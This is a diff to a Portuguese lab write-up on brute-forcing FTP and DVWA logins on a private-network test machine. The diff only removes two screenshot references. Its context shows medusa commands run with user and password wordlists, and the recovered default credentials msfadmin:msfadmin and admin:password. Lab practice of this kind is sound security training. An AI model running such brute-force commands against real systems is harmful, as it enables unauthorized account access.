@@ -72,7 +72,6 @@ medusa -h 192.168.56.102 -u users.txt -P passwords.txt -M ftp -T 10 -t 4 -f -F
 
 **Resultado:** `msfadmin:msfadmin` (validação via `ftp 192.168.56.102`).
 
-**Screenshot:** `/images/ftp_bruteforce_success.png`
 
 ---
 
@@ -90,7 +89,6 @@ medusa -h 192.168.56.102 -u admin -P passwords.txt -M http -m DIR:/dvwa/login.ph
 
 **Resultado:** `admin:password` — acesso ao dashboard do DVWA.
 
-**Screenshot:** `/images/dvwa_login_success.png`
 
 ---
 
